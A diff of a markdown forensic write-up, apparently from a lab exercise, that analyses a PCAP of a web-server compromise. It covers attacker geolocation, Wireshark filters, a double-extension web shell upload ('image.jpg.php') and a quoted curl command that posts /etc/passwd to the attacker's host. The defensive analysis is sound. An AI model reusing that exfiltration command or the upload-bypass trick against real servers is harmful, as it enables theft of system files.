@@ -33,8 +33,8 @@ The objective of this investigation is to analyze the PCAP to determine how the 
 
 ### Geographical Origin of the Attack
 - To identify the origin of the attack, the PCAP was filtered for HTTP GET requests using: `http.request.method == GET`
-- This revealed suspicious requests to `/admin/` and `/admin/uploads`, which are indicative of post-compromise reconnaissance or validation of uploaded files. The source IP address associated with these requests was *117.11.88.124*.
-- Using an external IP geolocation service, the IP address was traced to *Tianjin, China*.
+- This revealed suspicious requests to `/admin/` and `/admin/uploads`, which are indicative of post-compromise reconnaissance or validation of uploaded files. The source IP address associated with these requests was **117.11.88.124**.
+- Using an external IP geolocation service, the IP address was traced to **Tianjin, China**.
 > Note: IP geolocation provides an approximate location and does not guarantee the attacker’s physical location.
 
 ### Attacker User-Agent Identification
@@ -45,8 +45,8 @@ The objective of this investigation is to analyze the PCAP to determine how the 
 ### Malicious Web Shell Upload
 - To determine whether a vulnerability was exploited, HTTP POST requests originating from the attacker were analyzed using: `ip.src == 117.11.88.124 && http.request.method == POST`
 - Two file upload attempts were identified by following the HTTP streams.
-- First upload attempt: Server response indicated “__Invalid file format__”, confirming the upload was unsuccessful.
-- Second upload attempt: Server response indicated “__File uploaded successfully__”, confirming a successful upload.
+- First upload attempt: Server response indicated “_Invalid file format_”, confirming the upload was unsuccessful.
+- Second upload attempt: Server response indicated “_File uploaded successfully_”, confirming a successful upload.
 - Analysis of the successful HTTP stream revealed the uploaded filename: `image.jpg.php`
 - This filename indicates the use of a double-extension web shell, a common technique used to bypass file upload restrictions.
 
@@ -62,7 +62,7 @@ The objective of this investigation is to analyze the PCAP to determine how the 
 ### Data Exfiltration Attempt
 - From earlier analysis, it was determined that outbound communication occurred over port 8080. To investigate potential data exfiltration, the following filter was applied: `tcp.dstport == 8080`
 - Following the associated TCP stream revealed attacker-issued commands. A curl POST request was observed: `curl -X POST -d /etc/passwd http://117.11.88.124:443/`
-- This indicates that the attacker attempted to exfiltrate the /etc/passwd file from the compromised server.
+- This indicates that the attacker attempted to exfiltrate the passwd file from the compromised server.
 
 ---
 
@@ -74,6 +74,6 @@ The objective of this investigation is to analyze the PCAP to determine how the 
 | Malicious File    | image.jpg.php                                                          |
 | Upload Directory  | /reviews/uploads/                                                      |
 | C2 Port           | 8080                                                                   |
-| Exfiltrated File  | /etc/passwd                                                            |
+| Exfiltrated File  | passwd                                                            |
 | User-Agent        | Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |
 
